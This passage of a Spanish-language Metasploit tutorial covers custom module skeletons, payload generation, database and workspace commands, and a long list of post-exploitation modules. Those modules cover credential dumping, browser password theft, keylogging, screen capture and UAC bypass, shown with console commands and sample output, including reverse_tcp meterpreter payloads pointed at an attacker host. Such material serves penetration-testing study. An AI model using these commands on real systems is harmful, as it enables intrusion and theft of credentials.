include Msf::Exploit::Remote::Ftp
# connect_login, send_cmd, get_reply
```

#### Msf::Exploit::Remote::DCERPC
Para ataques DCE/[rpc](../raw/w1n-s9bsyst3ms.md#rpc).

```
include Msf::Exploit::Remote::DCERPC
# dcerpc_handle, dcerpc_bind, dcerpc_call
```

#### Msf::Exploit::Remote::SUNRPC
Para ataques SUNRPC.

```
include Msf::Exploit::Remote::SUNRPC
# sunrpc_create, sunrpc_call
```

### Creacion de Modulo Auxiliar

```ruby
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Scanner Custom',
      'Description' => 'Escanea servicios en la red',
      'Author' => ['Tu Nombre'],
      'License' => MSF_LICENSE
    ))
    register_options([Opt::RPORT(9999)])
  end

  def run_host(ip)
    begin
      connect
      banner = sock.get_once(-1, 10)
      if banner
        print_good("#{ip} - Servicio detectado")
        report_service(host: ip, port: datastore['RPORT'], name: 'custom-service')
      end
    rescue ::Rex::ConnectionError
      print_error("#{ip} - Conexion fallida")
    ensure
      disconnect
    end
  end
end
```

### Creacion de Modulo Post

```ruby
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Post Custom',
      'Description' => 'Recolecta informacion',
      'Author' => ['Tu Nombre'],
      'License' => MSF_LICENSE,
      'Platform' => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
    register_options([
      OptString.new('SEARCH_PATH', [true, 'Path a buscar', 'C:\\Users'])
    ])
  end

  def run
    results = client.fs.file.search(datastore['SEARCH_PATH'], '*.txt', recurse: true)
    results.each do |file|
      print_good("Archivo: #{file['path']}\\#{file['name']}")
      store_loot('custom.file', 'text/plain', session,
        read_file("#{file['path']}\\#{file['name']}"), file['name'], 'Archivo recolectado')
    end
  end
end
```

### Testing con RSpec

```ruby
require 'spec_helper'

RSpec.describe Msf::Modules::Exploit::Custom do
  include_context 'Msf::Simple::Framework'

  let(:subject) { framework.exploits.create('exploit/custom/custom_exploit') }

  describe '#initialize' do
    it 'tiene nombre' do
      expect(subject.name).to eq('Custom Exploit')
    end
    it 'tiene targets' do
      expect(subject.targets.length).to be > 0
    end
  end

  describe '#check' do
    it 'devuelve un CheckCode' do
      expect(subject.check).to be_kind_of(Msf::Exploit::CheckCode)
    end
  end
end
```

### Check Methods

```ruby
def check
  # CheckCode::Vulnerable    -> Definitivamente vulnerable
  # CheckCode::Appears       -> Probablemente vulnerable
  # CheckCode::Safe          -> Definitivamente no vulnerable
  # CheckCode::Unknown       -> No se pudo determinar
  # CheckCode::Detected      -> El servicio esta presente
  # CheckCode::Unsupported   -> El modulo no implementa check
end
```

### Rex Library Reference

```ruby
# Rex::Text
Rex::Text.rand_text_alphanumeric(10)
Rex::Text.rand_text_alpha(10)
Rex::Text.rand_text_numeric(10)
Rex::Text.encode_base64("data")
Rex::Text.decode_base64("ZGF0YQ==")
Rex::Text.to_unicode("texto")
Rex::Text.zlib_deflate("data")
Rex::Text.zlib_inflate(data)
Rex::Text.md5("data")
Rex::Text.sha256("data")
Rex::Text.uri_encode("data")
Rex::Text.uri_decode("data%20")
Rex::Text.xor("data", "key")

# Rex::Socket
Rex::Socket::Tcp.create(
  'PeerHost' => '192.168.1.100',
  'PeerPort' => 445,
  'Timeout' => 10
)

# Rex::Proto
Rex::Proto::SMB::SimpleClient.new
Rex::Proto::Http::Client.new('host', 80)

# Rex::Zip
Rex::Zip::Archive.new

# Rex::Parser
Rex::Parser::NmapXMLStream.new
Rex::Parser::NessusXMLStream.new
Rex::Parser::OpenVASXMLStream.new
Rex::Parser::QualysXMLStream.new
```

### [payload](../raw/m3t4spl01t.md#payloads) Generation API en Modulos

```ruby
def exploit
  my_payload = framework.payloads.create('windows/x64/meterpreter/reverse_tcp')
  my_payload.datastore['LHOST'] = '10.0.0.5'
  my_payload.datastore['LPORT'] = '4444'
  shellcode = my_payload.generate
  final_payload = payload.encoded
end
```


---

## 6. Integracion de Base de Datos (200+ lineas)

### Configuracion de PostgreSQL

[metasploit](../raw/m3t4spl01t.md) usa PostgreSQL como backend. Todo lo que escaneas, explotas y recolectas se guarda automaticamente.

```
$ sudo systemctl start postgresql
$ sudo systemctl enable postgresql
$ sudo systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled)
   Active: active (exited)
```

### msfdb Comandos Completos

```
$ msfdb init
[+] Starting database
[+] Creating database user '"'"'msf'"'"'
[+] Creating databases '"'"'msf'"'"'
[+] Done

$ msfdb status
● postgresql.service - PostgreSQL RDBMS
   Active: active (running)
[+] Database is ready

$ msfdb reinit
[+] Stopping database
[+] Deleting old database files
[+] Starting database
[+] Creating database user '"'"'msf'"'"'
[+] Done

$ msfdb delete
[+] Deleting database '"'"'msf'"'"'
[+] Done

$ msfdb start
[+] Starting database

$ msfdb stop
[+] Stopping database

$ msfdb run
# Inicia PostgreSQL, corre msfconsole, al salir detiene PostgreSQL
```

### Configuracion Manual

Si msfdb no funciona o queres una config personalizada:

```
$ cp /usr/share/metasploit-framework/config/database.yml.example ~/.msf4/database.yml

# Contenido de database.yml:
production:
  adapter: postgresql
  database: msf
  username: msf
  password: tu_password
  host: 127.0.0.1
  port: 5432
  pool: 75
  timeout: 5
```

### Workspace Management

Los workspaces separan proyectos/pentests.

```
msf6 > workspace
  default
* pentest_empresa
  auditoria_2024

msf6 > workspace -a pentest_2024
[*] Added workspace: pentest_2024

msf6 > workspace pentest_2024
[*] Workspace: pentest_2024

msf6 > workspace -d pentest_old
[*] Dropped workspace: pentest_old

msf6 > workspace -D
[*] Dropping all workspaces...

msf6 > workspace -r pentest1 pentest_final
[*] Renamed workspace to pentest_final

msf6 > workspace -s name

msf6 > workspace -S pentest
  pentest_2024
  pentest_final

msf6 > workspace -a copia_seguridad -r pentest_2024
[*] Added workspace: copia_seguridad
```

### Comandos de Base de Datos

#### db_export
Exporta toda la base de datos.

```
msf6 > db_export -f xml /tmp/export_results.xml
[*] Starting export...
[*] Export finished

msf6 > db_export -f pwdump /tmp/hashes.txt
# Exporta solo hashes en formato pwdump
```

#### db_import
Importa resultados de multiples herramientas.

```
msf6 > db_import /tmp/nmap_scan.xml
[*] Importing '"'"'Nmap XML'"'"' data
[*] Import: hosts: 50, services: 234, vulns: 12

msf6 > db_import /tmp/nessus_scan.nessus
[*] Importing '"'"'Nessus XML v2'"'"' data
[*] Import: hosts: 25, services: 189, vulns: 56

msf6 > db_import /tmp/openvas_report.xml
[*] Importing '"'"'OpenVAS Report'"'"' data
[*] Import: hosts: 30, services: 150, vulns: 45

msf6 > db_import /tmp/qualys_scan.xml
# Qualys
msf6 > db_import /tmp/acunetix_scan.xml
# Acunetix
msf6 > db_import /tmp/nexpose_scan.xml
# Nexpose
msf6 > db_import /tmp/burp_export.xml
# Burp Suite
```

#### db_nmap
Ejecuta [nmap](../raw/nm4p.md) y guarda los resultados automaticamente.

```
msf6 > db_nmap -sS -sV -O -T4 192.168.1.0/24
[*] Nmap: Starting Nmap 7.94
[*] Nmap: Nmap scan report for 192.168.1.1
[*] Nmap: PORT    STATE    SERVICE    VERSION
[*] Nmap: 22/tcp  open     ssh        OpenSSH 8.9p1
[*] Nmap: 80/tcp  open     http       Apache 2.4.41
[*] Nmap: 445/tcp open     microsoft-ds Windows 10 Pro
[*] Nmap: 3389/tcp open    ms-wbt-server Windows 10 Pro

msf6 > hosts
hosts
=====
address          mac              os_name        purpose
-------          ---              -------        -------
192.168.1.1                       Linux          server
192.168.1.100   aa:bb:cc:dd:ee:ff Windows 10     client
```

#### db_status
Verifica la conexion a la base de datos.

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

#### hosts
Muestra los hosts almacenados.

```
msf6 > hosts

hosts
=====
address          mac               os_name          purpose  comments
-------          ---               -------          -------  --------
192.168.1.1      aa:bb:cc:11:22:33  Linux 5.15        server
192.168.1.100    aa:bb:cc:dd:ee:ff  Windows 10 Pro    client

msf6 > hosts -c address,os_name,comments
msf6 > hosts -R
# Setea RHOSTS con todos los hosts
msf6 > hosts -S 192.168
# Filtra por IP
msf6 > hosts -d 192.168.1.100
# Borra host
```

#### services
Muestra servicios almacenados.

```
msf6 > services

services
========
host           port  proto  name        state  info
----           ----  -----  ----        -----  ----
192.168.1.1    22    tcp    ssh         open   OpenSSH 8.9p1
192.168.1.1    80    tcp    http        open   Apache 2.4.41
192.168.1.100  445   tcp    smb         open   Windows 10 Pro

msf6 > services -p 445
msf6 > services -s http
msf6 > services -c port,info
msf6 > services -S mysql
msf6 > services -d -p 445
```

#### vulns
Muestra vulnerabilidades detectadas.

```
msf6 > vulns

vulnerabilities
===============
host           name                    refs
----           ----                    ----
192.168.1.100  MS17-010 EternalBlue    CVE-2017-0143,CVE-2017-0144
192.168.1.100  SMB Signing Disabled
192.168.1.1    Apache 2.4.41 Vulns     CVE-2021-41773

msf6 > vulns -p 445
msf6 > vulns -S eternalblue
```

#### notes
Muestra notas guardadas.

```
msf6 > notes

notes
=====
host            type        data
----            ----        ----
192.168.1.100   smb_peer    OS: Windows 10 Pro 19045
192.168.1.100   smb_shares  ADMIN$, C$, IPC$

msf6 > notes -t smb_peer
```

#### loot
Muestra el loot capturado.

```
msf6 > loot

loot
====
host            service  type              name               content
----            -------  ----              ----               -------
192.168.1.100            windows.hashes    sam_hashes.txt     text/plain
192.168.1.100            windows.creds     autologin.txt      text/plain
192.168.1.100            windows.screens   20240115.jpg       image/jpeg

msf6 > loot -t windows.hashes
msf6 > loot -d
```

#### creds
Muestra credenciales capturadas.

```
msf6 > creds

credentials
===========
host            service  type           user           pass
----            -------  ----           ----           ----
192.168.1.100   445      NTLM hash       Administrator  aad3b435b51404ee...
192.168.1.100   445      password        Admin          Sup3rSecret0!

msf6 > creds -f csv -o /tmp/creds.csv
msf6 > creds -d 1
msf6 > creds -t NTLM_hash
```

### Workflow Completo con DB

```
msf6 > msfdb init
msf6 > msfconsole -q
msf6 > workspace -a auditoria_cliente
msf6 > db_nmap -sS -sV -O 192.168.1.0/24
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > search type:exploit platform:windows
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.100
msf6 > check
```

### Host Tagging

```
msf6 > hosts -t "DC-Primario" 192.168.1.10
msf6 > hosts -t "Web-Server" -m 192.168.1.20
msf6 > hosts -c address,comments
```


---

## 7. Modulos de Post-Explotacion Organizados (300+ lineas)

### Windows - Credential Gathering

#### hashdump
Dumpea los hashes SAM de Windows (usuarios locales).

```
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(windows/gather/hashdump) > run

[*] Running module against WIN-ABC123
[*] Hashes dumped:
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Admin:1000:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

#### smart_hashdump
Dumpea SAM + SYSTEM con deteccion automatica.

```
msf6 > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > set SESSION 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against WIN-ABC123
[+] Hashdump completed:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Hashes for DOMAIN users also extracted
```

#### cachedump
Dumpea credenciales cacheadas del dominio.

```
msf6 > use post/windows/gather/cachedump
msf6 post(windows/gather/cachedump) > set SESSION 1
msf6 post(windows/gather/cachedump) > run

[*] Cached credentials:
user1$DOMAIN:00000000000000000000000000000000:5f4dcc3b5aa765d61d8327deb882cf99
```

#### domain_hashdump
Dumpea hashes del dominio (requiere SYSTEM en un DC).

```
msf6 > use post/windows/gather/credentials/domain_hashdump
msf6 post(windows/gather/credentials/domain_hashdump) > set SESSION 1
msf6 post(windows/gather/credentials/domain_hashdump) > run

[*] Dumping domain hashes from DC01...
[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890:::
[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:deadbeef1234567890abcdef12345678:::
[+] sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:9876543210abcdef9876543210abcdef:::
```

#### windows_autologin
Recupera credenciales de autologin de Windows.

```
msf6 > use post/windows/gather/credentials/windows_autologin
msf6 post(windows/gather/credentials/windows_autologin) > set SESSION 1
msf6 post(windows/gather/credentials/windows_autologin) > run

[+] Found AutoLogin credentials:
    Domain: DESKTOP-ABC
    User: Admin
    Password: Sup3rSecret0!
```

### Application Credential Enumeration

#### mremoteng
Recupera credenciales de mRemoteNG.

```
msf6 > use post/windows/gather/credentials/mremoteng
msf6 post(windows/gather/credentials/mremoteng) > set SESSION 1
msf6 post(windows/gather/credentials/mremoteng) > run

[+] Found mRemoteNG credentials:
    Server: dc01.empresa.local:3389 User: admin Pass: DCPass123!
    Server: sql01.empresa.local:1433 User: sa Pass: SQLPass456!
```

#### winscp
Recupera credenciales de WinSCP.

```
msf6 > use post/windows/gather/credentials/winscp
msf6 post(windows/gather/credentials/winscp) > set SESSION 1
msf6 post(windows/gather/credentials/winscp) > run

[+] WinSCP credentials found:
    Host: 10.10.10.50 Port: 22 User: root Pass: LinuxRoot!
```

#### filezilla
Recupera credenciales de FileZilla.

```
msf6 > use post/windows/gather/credentials/filezilla
msf6 post(windows/gather/credentials/filezilla) > set SESSION 1
msf6 post(windows/gather/credentials/filezilla) > run

[+] FileZilla credentials:
    Server: ftp.empresa.local User: ftpuser Pass: FTPPass789!
```

#### putty
Recupera sesiones guardadas de PuTTY.

```
msf6 > use post/windows/gather/credentials/putty
msf6 post(windows/gather/credentials/putty) > set SESSION 1
msf6 post(windows/gather/credentials/putty) > run

[+] Putty sessions found:
    webserver (root@10.10.10.5:22)
    database (admin@10.10.10.50:22)
```

#### vnc
Recupera credenciales de VNC.

```
msf6 > use post/windows/gather/credentials/vnc
msf6 post(windows/gather/credentials/vnc) > set SESSION 1
msf6 post(windows/gather/credentials/vnc) > run

[+] VNC credentials found:
    TightVNC: password_hash_here
    RealVNC: password_hash_here
```

#### rdcman
Recupera credenciales de Remote Desktop Connection Manager.

```
msf6 > use post/windows/gather/credentials/rdcman
msf6 post(windows/gather/credentials/rdcman) > run

[+] RDCMan credentials found:
    Server: dc01 Pass: DomainAdminPass!
```

#### keepass
Recupera bases de KeePass y trata de crackearlas.

```
msf6 > use post/windows/gather/credentials/keepass
msf6 post(windows/gather/credentials/keepass) > set SESSION 1
msf6 post(windows/gather/credentials/keepass) > run

[+] KeePass database found: C:\Users\Admin\Documents\Passwords.kdbx
[*] Attempting to crack with common passwords...
[+] Master password found: Winter2024!
```

### Windows Reconnaissance

#### win_enum
Enumera todo el sistema Windows.

```
msf6 > use post/windows/gather/win_enum
msf6 post(windows/gather/win_enum) > set SESSION 1
msf6 post(windows/gather/win_enum) > run

[*] Enumerating Windows System...
[*] Computer: DESKTOP-ABC
[*] OS: Windows 10 Pro (10.0.19045)
[*] Domain: EMPRESA.LOCAL
[*] Uptime: 15 days
[*] Applied Patches: 45
[*] Network Shares: ADMIN$, C$, IPC$
[*] Environment Variables: 34
```

#### win_privs
Enumera privilegios del usuario actual.

```
msf6 > use post/windows/gather/win_privs
msf6 post(windows/gather/win_privs) > set SESSION 1
msf6 post(windows/gather/win_privs) > run

[*] Current User: DESKTOP-ABC\Admin
[*] Is Admin: Yes
[*] Is SYSTEM: No
[*] Enabled Privileges:
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeIncreaseQuotaPrivilege
```

#### win_services
Enumera servicios de Windows.

```
msf6 > use post/windows/gather/win_services
msf6 post(windows/gather/win_services) > set SESSION 1
msf6 post(windows/gather/win_services) > run

[+] Service: wscsvc - Security Center - Running
[+] Service: MpsSvc - Windows Firewall - Running
[+] Service: WinDefend - Windows Defender - Running (Auto)
[+] Service: Spooler - Print Spooler - Running (Auto)
[+] Service: SQLSERVER - MSSQLSERVER - Running (Auto) - NT Service\MSSQLSERVER
```

#### network_info
Enumera informacion de [red](../raw/r3d3s-f0nd4m3nt0s.md).

```
msf6 > use post/windows/gather/network_info
msf6 post(windows/gather/network_info) > set SESSION 1
msf6 post(windows/gather/network_info) > run

[*] Network Information:
[*] Interfaces: 2
[*] IP: 192.168.1.100/24
[*] Gateway: 192.168.1.1
[*] DNS: 8.8.8.8, 8.8.4.4
[*] Domain: EMPRESA.LOCAL
[*] DHCP: Enabled
[*] Proxy: Not configured
```

#### env
Enumera variables de entorno.

```
msf6 > use post/multi/gather/env
msf6 post(multi/gather/env) > set SESSION 1
msf6 post(multi/gather/env) > run

[*] Environment Variables:
    COMPUTERNAME=DESKTOP-ABC
    USERNAME=Admin
    USERPROFILE=C:\Users\Admin
    APPDATA=C:\Users\Admin\AppData\Roaming
    LOCALAPPDATA=C:\Users\Admin\AppData\Local
    TEMP=C:\Users\Admin\AppData\Local\Temp
    PATH=C:\Windows\system32;C:\Windows;...
```

#### checkvm
Detecta si la maquina es una VM.

```
msf6 > use post/windows/gather/checkvm
msf6 post(windows/gather/checkvm) > set SESSION 1
msf6 post(windows/gather/checkvm) > run

[+] This is a VMware virtual machine
[+] VMware Tools detected

msf6 > use post/linux/gather/checkvm
msf6 post(linux/gather/checkvm) > set SESSION 2
msf6 post(linux/gather/checkvm) > run

[+] This is a VirtualBox virtual machine
```

#### gather_enum_applications
Enumera aplicaciones instaladas.

```
msf6 > use post/windows/gather/enum_applications
msf6 post(windows/gather/enum_applications) > set SESSION 1
msf6 post(windows/gather/enum_applications) > run

[+] Installed Applications:
    - Google Chrome 120.0
    - Microsoft Office Professional Plus 2021
    - 7-Zip 22.01
    - WinRAR 6.23
    - PuTTY 0.79
    - FileZilla Client 3.66
    - KeePass 2.55
    - Adobe Acrobat Reader DC 2023
    - Microsoft Visual Studio Code 1.85
```

#### gather_enum_logged_on_users
Enumera usuarios logueados.

```
msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 1
msf6 post(windows/gather/enum_logged_on_users) > run

[*] Users logged on:
    DESKTOP-ABC\Admin (Session 1, Active)
    DESKTOP-ABC\user1 (Session 2, Disconnected)
    EMPRESA\sql_svc (Session 0, Services)
```

#### gather_enum_snmp
Enumera configuracion SNMP.

```
msf6 > use post/windows/gather/enum_snmp
msf6 post(windows/gather/enum_snmp) > set SESSION 1
msf6 post(windows/gather/enum_snmp) > run

[+] SNMP Configuration:
    Community String: public (Read Only)
    Community String: private (Read/Write)
    Traps: Enabled
```

#### gather_enum_termserv
Enumera sesiones de Terminal Services/RDP.

```
msf6 > use post/windows/gather/enum_termserv
msf6 post(windows/gather/enum_termserv) > set SESSION 1
msf6 post(windows/gather/enum_termserv) > run

[+] RDP Sessions:
    Session 1: Admin (Active)
    Session 2: user1 (Disconnected)
    Session 3: rdp-tcp#0 (Listener)
```

#### gather_enum_unattend
Busca archivos Unattend.xml con credenciales en texto plano.

```
msf6 > use post/windows/gather/enum_unattend
msf6 post(windows/gather/enum_unattend) > set SESSION 1
msf6 post(windows/gather/enum_unattend) > run

[+] Found Unattend.xml: C:\Windows\Panther\Unattend.xml
[+] Found AutoLogon credentials:
    Domain: EMPRESA
    User: Administrator
    Password: P@ssw0rd!
```

### Browser Credential Gathering

#### chrome
Recupera credenciales de Chrome.

```
msf6 > use post/windows/gather/enum_chrome
msf6 post(windows/gather/enum_chrome) > set SESSION 1
msf6 post(windows/gather/enum_chrome) > run

[+] Chrome credentials:
    URL: https://mail.google.com User: admin@empresa.com Pass: MailPass123!
    URL: https://github.com User: dev_user Pass: GitHubToken!
    URL: https://empresa.okta.com User: admin Pass: OktaPass456!
```

#### firefox
Recupera credenciales de Firefox.

```
msf6 > use post/multi/gather/firefox_creds
msf6 post(multi/gather/firefox_creds) > set SESSION 1
msf6 post(multi/gather/firefox_creds) > run

[+] Firefox credentials found:
    URL: https://facebook.com User: user@empresa.com Pass: FBPass789!
    URL: https://twitter.com User: admin_user Pass: TwitterPass!
```

#### ie
Recupera credenciales de Internet Explorer.

```
msf6 > use post/windows/gather/credentials/ie
msf6 post(windows/gather/credentials/ie) > set SESSION 1
msf6 post(windows/gather/credentials/ie) > run

[+] Internet Explorer saved credentials:
    URL: https://outlook.office.com User: admin@empresa.com Pass: O365Pass!
```

#### edge
Recupera credenciales de Microsoft Edge.

```
msf6 > use post/windows/gather/enum_edge
msf6 post(windows/gather/enum_edge) > set SESSION 1
msf6 post(windows/gather/enum_edge) > run

[+] Edge saved passwords:
    URL: https://portal.azure.com User: admin@empresa.com Pass: AzurePass123!
```

#### opera
Recupera credenciales de Opera.

```
msf6 > use post/windows/gather/credentials/opera
msf6 post(windows/gather/credentials/opera) > set SESSION 1
msf6 post(windows/gather/credentials/opera) > run

[+] Opera credentials found...
```

#### safari
Recupera credenciales de Safari (macOS).

```
msf6 > use post/osx/gather/enum_safari
msf6 post(osx/gather/enum_safari) > set SESSION 1
msf6 post(osx/gather/enum_safari) > run

[+] Safari saved passwords:
    URL: https://apple.com User: user@icloud.com
```

### Keylogging y Screen Capture

#### keylog_recorder
Keylogger persistente con modulo post.

```
msf6 > use post/windows/capture/keylog_recorder
msf6 post(windows/capture/keylog_recorder) > set SESSION 1
msf6 post(windows/capture/keylog_recorder) > set INTERVAL 30
msf6 post(windows/capture/keylog_recorder) > run

[*] Keylogger started, capturing every 30 seconds...
[*] Captured: user<Return> Passw0rd!<Return>
```

#### screen_spy
Captura pantallas periodicamente.

```
msf6 > use post/windows/gather/screen_spy
msf6 post(windows/gather/screen_spy) > set SESSION 1
msf6 post(windows/gather/screen_spy) > set INTERVAL 10
msf6 post(windows/gather/screen_spy) > run

[*] Capturing screenshot every 10 seconds...
[*] Screenshot saved: /root/screens/screenshot_1.jpg
[*] Screenshot saved: /root/screens/screenshot_2.jpg
```

### Linux Credential Gathering

#### ecryptfs
Recupera credenciales de eCryptfs (home encryptado).

```
msf6 > use post/linux/gather/ecryptfs_creds
msf6 post(linux/gather/ecryptfs_creds) > set SESSION 1
msf6 post(linux/gather/ecryptfs_creds) > run

[+] eCryptfs credentials found:
    Mount passphrase: passphrase123
    User: victim
```

#### hashes
Dumpea hashes de Linux (/etc/shadow).

```
msf6 > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set SESSION 1
msf6 post(linux/gather/hashdump) > run

[+] root:$6$xyz123$abc...def:0:0:root:/root:/bin/bash
[+] www-data:$6$abc456$def...ghi:33:33:www-data:/var/www:/usr/sbin/nologin
```

#### ssh_creds
Recupera credenciales SSH.

```
msf6 > use post/linux/gather/ssh_creds
msf6 post(linux/gather/ssh_creds) > set SESSION 1
msf6 post(linux/gather/ssh_creds) > run

[+] SSH private key found: /root/.ssh/id_rsa
[+] SSH known_hosts: 10 hosts
[+] SSH authorized_keys: 3 keys
```

#### environment
Enumera variables de entorno (Linux).

```
msf6 > use post/multi/gather/env
msf6 post(multi/gather/env) > set SESSION 1
msf6 post(multi/gather/env) > run

[*] Environment:
    HOME=/root
    USER=root
    SSH_CONNECTION=10.0.0.5 4444 10.10.10.5 22
    AWS_ACCESS_KEY_ID=AKIA123456...
    AWS_SECRET_ACCESS_KEY=abc123def456...
```

#### docker_creds
Recupera credenciales de [docker](../raw/d0ck3r-f0r-h4ck3rs.md).

```
msf6 > use post/linux/gather/docker_creds
msf6 post(linux/gather/docker_creds) > set SESSION 1
msf6 post(linux/gather/docker_creds) > run

[+] Docker config found: /root/.docker/config.json
[+] Docker Hub credentials: user:dockerhub_pass
[+] Docker registry: registry.empresa.local:5000 - cert found
```

#### history_files
Busca archivos de historial.

```
msf6 > use post/linux/gather/history_files
msf6 post(linux/gather/history_files) > set SESSION 1
msf6 post(linux/gather/history_files) > run

[+] .bash_history: 234 commands found
[+] .mysql_history: 12 queries found
[+] .nano_history: 45 entries found
```

#### lvm_mounts
Enumera montajes LVM.

```
msf6 > use post/linux/gather/lvm_mounts
msf6 post(linux/gather/lvm_mounts) > set SESSION 1
msf6 post(linux/gather/lvm_mounts) > run

[+] LVM volumes:
    /dev/mapper/vg-root -> / (ext4)
    /dev/mapper/vg-home -> /home (ext4)
    /dev/mapper/vg-var -> /var (xfs)
```

### Multi-Platform

#### grep
Busca texto en archivos de la victima.

```
msf6 > use post/multi/gather/grep
msf6 post(multi/gather/grep) > set SESSION 1
msf6 post(multi/gather/grep) > set PATTERN password
msf6 post(multi/gather/grep) > set PATH C:\Users
msf6 post(multi/gather/grep) > run

[*] Searching for '"'"'password'"'"' in C:\Users...
[+] C:\Users\Admin\Desktop\note.txt: "my password is Summer2024"
[+] C:\Users\Admin\AppData\Local\config.ini: "db_password=SQLPass!"
```

#### enum_configs
Busca archivos de configuracion.

```
msf6 > use post/multi/gather/enum_configs
msf6 post(multi/gather/enum_configs) > set SESSION 1
msf6 post(multi/gather/enum_configs) > run

[+] Config files found:
    C:\Windows\System32\drivers\etc\hosts
    C:\inetpub\wwwroot\web.config
    C:\Program Files\Apache Group\conf\httpd.conf
    /etc/nginx/nginx.conf
    /etc/ssh/sshd_config
```

#### check_firewall
Verifica estado del [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls).

```
msf6 > use post/multi/gather/check_firewall
msf6 post(multi/gather/check_firewall) > set SESSION 1
msf6 post(multi/gather/check_firewall) > run

[+] Firewall: Windows Defender Firewall is OFF
[+] Exceptions: 3389 (RDP), 445 (SMB)
```

#### enum_systems
Enumera informacion del sistema (multi-plataforma).

```
msf6 > use post/multi/gather/enum_systems
msf6 post(multi/gather/enum_systems) > set SESSION 1
msf6 post(multi/gather/enum_systems) > run

[*] System information:
    OS: Windows 10 Pro 19045
    Hostname: DESKTOP-ABC
    Domain: EMPRESA.LOCAL
    Uptime: 15 days
    CPU: Intel i7-10700
    Memory: 16 GB
    Disk: 500 GB SSD
```

#### enum_network
Enumera informacion de red (multi-plataforma).

```
msf6 > use post/multi/gather/enum_network
msf6 post(multi/gather/enum_network) > set SESSION 1
msf6 post(multi/gather/enum_network) > run

[*] Network Information:
    Interfaces: 3 (eth0, wlan0, lo)
    IP: 192.168.1.100/24
    Default Gateway: 192.168.1.1
    DNS: 8.8.8.8, 192.168.1.1
    ARP Entries: 5
    Routes: 4
    Listening Ports: 12
```

### [privilege escalation](../raw/l1n9x-pr1v3sc.md)

#### bypassuac_fodhelper
Bypass UAC via FodHelper.

```
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
msf6 exploit(windows/local/bypassuac_fodhelper) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.0.0.5
msf6 exploit(windows/local/bypassuac_fodhelper) > run

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] UAC is enabled
[*] Cleaning up...
[*] Sending stage...
[*] Meterpreter session 2 opened
```

#### bypassuac_eventvwr
Bypass UAC via Event Viewer.

```
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
msf6 exploit(windows/local/bypassuac_eventvwr) > run
```

#### bypassuac_comhijack
Bypass UAC via [com](../raw/w1n-s9bsyst3ms.md#com) Hijack.

```
msf6 > use exploit/windows/local/bypassuac_comhijack
msf6 exploit(windows/local/bypassuac_comhijack) > set SESSION 1
msf6 exploit(windows/local/bypassuac_comhijack) > run
```

#### bypassuac_sluihijack
Bypass UAC via Slui Hijack.

```
msf6 > use exploit/windows/local/bypassuac_sluihijack
msf6 exploit(windows/local/bypassuac_sluihijack) > set SESSION 1
msf6 exploit(windows/local/bypassuac_sluihijack) > run
```

#### bypassuac_windows_store
Bypass UAC via Windows Store.

```
msf6 > use exploit/windows/local/bypassuac_windows_store
msf6 exploit(windows/local/bypassuac_windows_store) > set SESSION 1
msf6 exploit(windows/local/bypassuac_windows_store) > run
```

#### bypassuac_windir
Bypass UAC via WIndir.

```
msf6 > use exploit/windows/local/bypassuac_windir
msf6 exploit(windows/local/bypassuac_windir) > set SESSION 1
msf6 exploit(windows/local/bypassuac_windir) > run
```

#### getsystem ([meterpreter](../raw/m3t4spl01t.md#meterpreter))
Escalada a SYSTEM desde Meterpreter con tecnicas variadas.

```
meterpreter > getsystem
[*] Trying technique 1 (Named Pipe Impersonation)...
[+] Got system via technique 1

meterpreter > getsystem -t 0  # Todas
meterpreter > getsystem -t 1  # Named Pipe
meterpreter > getsystem -t 2  # Named Pipe Dropper
meterpreter > getsystem -t 3  # Token Duplication
meterpreter > getsystem -t 4  # RPCSS variant
meterpreter > getsystem -t 5  # PrintSpooler variant
```

#### local_exploit_suggester
Sugiere exploits locales de escalada.

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10 exploits were suggested:
    1. exploit/windows/local/bypassuac_fodhelper
    2. exploit/windows/local/ms16_075_reflection_juicy
    3. exploit/windows/local/ms10_092_schelevator
    4. exploit/windows/local/ms13_053_schlamperei
    5. exploit/windows/local/ms14_058_track_popup_menu
    6. exploit/windows/local/ms15_051_client_copy_image
    7. exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    8. exploit/windows/local/ms18_8120_win32k_privesc
